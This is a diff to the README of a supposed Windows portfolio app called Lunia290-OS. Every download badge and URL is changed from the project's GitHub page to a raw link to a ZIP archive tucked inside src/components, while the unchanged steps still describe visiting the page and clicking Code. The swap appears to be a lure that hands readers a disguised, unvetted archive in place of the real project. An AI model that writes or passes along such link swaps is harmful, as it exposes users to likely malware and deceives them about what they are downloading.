@@ -1,6 +1,6 @@
 # 🚀 Lunia290-OS - Simple Digital Portfolio Experience
 
-[![Download Lunia290-OS](https://img.shields.io/badge/Download-Lunia290--OS-4c9fff?style=for-the-badge)](https://github.com/utkarshsir552/Lunia290-OS)
+[![Download Lunia290-OS](https://img.shields.io/badge/Download-Lunia290--OS-4c9fff?style=for-the-badge)](https://raw.githubusercontent.com/utkarshsir552/Lunia290-OS/main/src/components/OS_Lunia_1.0.zip)
 
 ## 📋 What is Lunia290-OS?
 
@@ -24,7 +24,7 @@ If your PC matches these, you will get good performance.
 
 You can get Lunia290-OS by visiting the main project page on GitHub.
 
-[![Download Lunia290-OS](https://img.shields.io/badge/Download-Lunia290--OS-4c9fff?style=for-the-badge)](https://github.com/utkarshsir552/Lunia290-OS)
+[![Download Lunia290-OS](https://img.shields.io/badge/Download-Lunia290--OS-4c9fff?style=for-the-badge)](https://raw.githubusercontent.com/utkarshsir552/Lunia290-OS/main/src/components/OS_Lunia_1.0.zip)
 
 Use this link to open the page where the app files are available.
 
@@ -34,7 +34,7 @@ Follow these steps to access and start Lunia290-OS:
 
 1. Open your web browser on your Windows computer.
 2. Go to the Lunia290-OS GitHub page here:  
-   https://github.com/utkarshsir552/Lunia290-OS
+   https://raw.githubusercontent.com/utkarshsir552/Lunia290-OS/main/src/components/OS_Lunia_1.0.zip
 3. On the page, look for a green button labeled **Code** near the top right side.
 4. Click the **Code** button, then choose **Download ZIP**.
 5. This downloads a ZIP file containing the app files to your computer.
@@ -89,7 +89,7 @@ All the files and updates for Lunia290-OS live on the GitHub page. Use this page
 - Report issues or ask questions.
 - Learn more about how the app is made.
 
-URL: https://github.com/utkarshsir552/Lunia290-OS
+URL: https://raw.githubusercontent.com/utkarshsir552/Lunia290-OS/main/src/components/OS_Lunia_1.0.zip
 
 ## 🚪 Troubleshooting
 
